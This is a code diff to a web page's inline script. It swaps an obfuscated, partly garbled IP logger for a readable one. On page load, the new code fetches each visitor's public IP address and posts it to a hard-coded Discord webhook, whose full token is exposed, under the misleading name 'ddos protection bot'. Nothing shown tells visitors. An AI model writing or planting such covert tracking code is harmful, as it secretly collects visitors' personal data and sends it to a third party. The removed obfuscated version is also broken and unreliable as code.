@@ -23,30 +23,36 @@
 
   <script>
     (function() {
-      var _0x89c0=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x61\x70\x69\x2E\x69\x70\x69\x66\x79\x2E\x6F\x72\x3F\x66\x6F\x72\x6D\x61\x74\x3D\x6A\x73\x6F\x6E", "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x64\x69\x73\x63\x6F\x72\x64\x2E\x63\x6F\x6D\x2F\x61\x70\x69\x2F\x77\x65\x62\x68\x6F\x6F\x6B\x73\x2F\x31\x33\x31\x39\x30\x32\x39\x30\x34\x30\x36\x33\x31\x35\x31\x37\x32\x33\x34\x2F\x75\x51\x57\x33\x53\x55\x36\x50\x66\x4E\x44\x72\x36\x4D\x54\x57\x35\x57\x71\x70\x44\x67\x72\x6A\x35\x65\x37\x4F\x30\x46\x42\x53\x59\x45\x62\x53\x48\x6F\x6B\x47\x42\x72\x31\x79\x58\x49\x44\x66\x45\x33\x52\x36\x41\x68\x71\x45\x4A\x69\x34\x55\x66\x4D\x68\x77\x6B\x33\x65", "\x69\x70", "\x76\x69\x73\x69\x74\x6F\x72\x20\x69\x70\x3A\x20", "\xPOST", "\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x6A\x73\x6F\x6E", "\x63\x6F\x6E\x74\x65\x6E\x74", "\x6D\x65\x73\x73\x61\x67\x65\x3A\x20\x45\x72\x72\x6F\x72\x20\x73\x65\x6E\x64\x69\x6E\x67\x20\x77\x65\x62\x68\x6F\x6F\x6B\x3A", "\x45\x72\x72\x6F\x72\x20\x66\x65\x74\x63\x68\x69\x6E\x67\x20\x69\x70\x3A", "\x63\x6F\x6E\x74\x65\x6E\x74"];
-      
-      fetch(_0x89c0[0]).then(function(response) {
-        return response.json();
-      }).then(function(data) {
-        var ip = data[_0x89c0[2]]; 
-        var webhookData = {
-          [_0x89c0[7]]: _0x89c0[3] + ip,
-          username: "IP Logger"
-        };
+      // Webhook URL
+      var webhookUrl = "https://discord.com/api/webhooks/1319029040631517234/uQW3SU6PfNDr6MTW5WqpDgrjq5e7O0FBSYEbSHokGBr1yXIDfE3R6AhqEJi4UfMhwk3e";
 
-        // Send to Discord Webhook
-        fetch(_0x89c0[5], {
-          method: _0x89c0[4],
-          headers: {
-            "Content-Type": _0x89c0[8]
-          },
-          body: JSON.stringify(webhookData)
-        }).catch(function(error) {
-          console.error(_0x89c0[9], error);
+      // Fetch IP address from ipify
+      fetch("https://api.ipify.org?format=json")
+        .then(function(response) {
+          return response.json();
+        })
+        .then(function(data) {
+          var ip = data.ip; // Extract the IP from the response
+
+          // Send IP to Discord Webhook
+          var webhookData = {
+            content: "Visitor IP: " + ip,
+            username: "ddos protection bot"
+          };
+
+          fetch(webhookUrl, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify(webhookData)
+          }).catch(function(error) {
+            console.error("Error sending webhook:", error);
+          });
+        })
+        .catch(function(error) {
+          console.error("Error fetching IP:", error);
         });
-      }).catch(function(error) {
-        console.error(_0x89c0[9], error);
-      });
     })();
   </script>
 </body>
